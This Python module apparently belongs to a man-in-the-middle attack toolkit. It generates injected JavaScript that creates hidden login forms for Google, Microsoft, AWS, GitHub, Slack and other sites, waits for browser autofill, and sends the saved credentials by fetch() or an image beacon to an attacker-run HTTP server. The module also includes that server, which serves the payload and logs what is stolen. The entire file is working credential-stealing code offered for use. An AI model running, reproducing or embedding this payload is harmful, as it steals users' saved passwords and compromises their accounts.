"""
Browser Credential Extraction
------------------------------
Generates JS payload that exploits browser autofill to extract saved passwords:
  1. Creates hidden login forms for common sites (Google, Facebook, corporate)
  2. Monitors for autofill events on those forms
  3. Exfiltrates filled credentials via fetch() to attacker HTTP server

Includes a built-in HTTP server to receive exfiltrated data.
Works with HTTPInjector for delivery via MITM.
"""

import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

from .config import log


class _ExfilHandler(BaseHTTPRequestHandler):
    """HTTP handler that receives exfiltrated credentials."""

    def log_message(self, format, *args):
        """Suppress default HTTP server logging."""
        pass

    def do_POST(self):
        """Handle credential exfiltration POST requests."""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode(errors='ignore')

        try:
            data = json.loads(body)
        except (json.JSONDecodeError, ValueError):
            # Try URL-encoded
            data = parse_qs(body)

        if data:
            self.server.credential_callback(data, self.client_address)

        # Send CORS-friendly response
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def do_OPTIONS(self):
        """Handle CORS preflight."""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        """Serve the extraction payload if requested."""
        if self.path == "/payload.js":
            js = self.server.get_payload_js()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(js.encode())
        else:
            self.send_response(404)
            self.end_headers()


class BrowserCredentialExtractor:
    """
    Extract saved browser credentials via autofill exploitation.

    Generates a JS payload that creates hidden login forms targeting
    common services, detects autofill events, and exfiltrates captured
    credentials to the built-in HTTP receiver.
    """

    def __init__(self, listen_host="0.0.0.0", listen_port=8888,
                 exfil_host=None):
        self.listen_host = listen_host
        self.listen_port = listen_port
        # Exfil host is what the JS uses to POST back
        self.exfil_host = exfil_host or "10.0.0.1"

        self._running = False
        self._server = None
        self._server_thread = None
        self._extracted = []
        self._lock = threading.Lock()

        # Sites to create hidden forms for
        self._target_sites = [
            {"name": "google", "action": "https://accounts.google.com",
             "fields": [("email", "email"), ("password", "password")]},
            {"name": "facebook", "action": "https://www.facebook.com/login",
             "fields": [("email", "email"), ("pass", "password")]},
            {"name": "microsoft", "action": "https://login.microsoftonline.com",
             "fields": [("loginfmt", "email"), ("passwd", "password")]},
            {"name": "corporate", "action": "/login",
             "fields": [("username", "text"), ("password", "password")]},
            {"name": "aws", "action": "https://signin.aws.amazon.com",
             "fields": [("username", "email"), ("password", "password")]},
            {"name": "github", "action": "https://github.com/session",
             "fields": [("login", "text"), ("password", "password")]},
            {"name": "slack", "action": "https://slack.com/signin",
             "fields": [("email", "email"), ("password", "password")]},
            {"name": "office365", "action": "https://login.microsoft.com",
             "fields": [("username", "email"), ("password", "password")]},
        ]

    def start(self):
        """Start the HTTP exfiltration receiver."""
        if self._running:
            return

        self._running = True

        # Create HTTP server
        self._server = HTTPServer(
            (self.listen_host, self.listen_port), _ExfilHandler
        )
        self._server.credential_callback = self._on_credential_received
        self._server.get_payload_js = self.get_payload_js

        self._server_thread = threading.Thread(
            target=self._serve, daemon=True, name="browser-cred-server"
        )
        self._server_thread.start()

        log.info(f"Browser credential extractor listening on "
                 f"{self.listen_host}:{self.listen_port}")

    def _serve(self):
        """Run HTTP server until stopped."""
        while self._running:
            self._server.handle_request()

    def _on_credential_received(self, data, client_address):
        """Callback when credentials are received from JS payload."""
        entry = {
            "data": data,
            "source_ip": client_address[0],
            "source_port": client_address[1],
            "timestamp": time.time(),
        }

        with self._lock:
            self._extracted.append(entry)

        # Log the extraction
        if isinstance(data, dict):
            site = data.get("site", "unknown")
            username = data.get("username", data.get("email", ""))
            log.critical(f"BROWSER CRED EXTRACTED: {site} - {username} "
                         f"from {client_address[0]}")
        else:
            log.info(f"Credential data received from {client_address[0]}")

    def get_payload_js(self):
        """
        Generate the JavaScript payload for credential extraction.

        The payload:
          1. Creates hidden iframes/forms mimicking login pages
          2. Waits for browser autofill to populate fields
          3. Reads filled values and exfiltrates via fetch()

        Returns:
            JavaScript code as string
        """
        exfil_url = f"http://{self.exfil_host}:{self.listen_port}/exfil"

        # Build form definitions for JS
        forms_js = []
        for site in self._target_sites:
            fields_def = json.dumps(site["fields"])
            forms_js.append(
                f'{{name:"{site["name"]}",action:"{site["action"]}",'
                f'fields:{fields_def}}}'
            )
        forms_array = "[" + ",".join(forms_js) + "]"

        payload = f"""
(function() {{
    'use strict';
    var EXFIL_URL = '{exfil_url}';
    var SITES = {forms_array};
    var extracted = {{}};

    function createHiddenForm(site) {{
        var container = document.createElement('div');
        container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;'
            + 'width:1px;height:1px;overflow:hidden;opacity:0.01;';

        var form = document.createElement('form');
        form.action = site.action;
        form.method = 'POST';
        form.autocomplete = 'on';

        site.fields.forEach(function(field) {{
            var input = document.createElement('input');
            input.type = field[1];
            input.name = field[0];
            input.id = 'autofill_' + site.name + '_' + field[0];
            input.autocomplete = field[1] === 'password' ? 'current-password' : 'username';
            input.style.cssText = 'display:block;width:100px;height:20px;';
            form.appendChild(input);
        }});

        container.appendChild(form);
        document.body.appendChild(container);
        return form;
    }}

    function checkAutofill(site, form) {{
        var creds = {{}};
        var hasData = false;

        site.fields.forEach(function(field) {{
            var input = form.querySelector('[name="' + field[0] + '"]');
            if (input && input.value && input.value.length > 0) {{
                creds[field[0]] = input.value;
                hasData = true;
            }}
        }});

        if (hasData && !extracted[site.name]) {{
            extracted[site.name] = true;
            creds.site = site.name;
            creds.url = window.location.href;
            creds.timestamp = new Date().toISOString();
            exfiltrate(creds);
        }}
    }}

    function exfiltrate(data) {{
        try {{
            fetch(EXFIL_URL, {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data),
                mode: 'no-cors'
            }});
        }} catch(e) {{
            // Fallback: image beacon
            var img = new Image();
            img.src = EXFIL_URL + '?d=' + encodeURIComponent(JSON.stringify(data));
        }}
    }}

    // Wait for DOM ready
    function init() {{
        var forms = [];
        SITES.forEach(function(site) {{
            var form = createHiddenForm(site);
            forms.push({{site: site, form: form}});
        }});

        // Check periodically for autofill
        var checks = 0;
        var interval = setInterval(function() {{
            forms.forEach(function(item) {{
                checkAutofill(item.site, item.form);
            }});
            checks++;
            if (checks > 60) {{
                clearInterval(interval);
            }}
        }}, 500);

        // Also check on focus/input events
        document.addEventListener('input', function() {{
            forms.forEach(function(item) {{
                checkAutofill(item.site, item.form);
            }});
        }});
    }}

    if (document.readyState === 'loading') {{
        document.addEventListener('DOMContentLoaded', init);
    }} else {{
        init();
    }}
}})();
"""
        return payload.strip()

    def stop(self):
        """Stop the exfiltration server."""
        self._running = False
        if self._server:
            try:
                self._server.shutdown()
            except Exception:
                pass
            self._server = None
        if self._server_thread:
            self._server_thread.join(timeout=5)
            self._server_thread = None
        log.info("Browser credential extractor stopped")

    def get_extracted(self):
        """Return all extracted credentials."""
        with self._lock:
            return list(self._extracted)

    def get_stats(self):
        """Return extraction statistics."""
        with self._lock:
            return {
                "running": self._running,
                "listen_port": self.listen_port,
                "credentials_extracted": len(self._extracted),
                "target_sites": len(self._target_sites),
            }
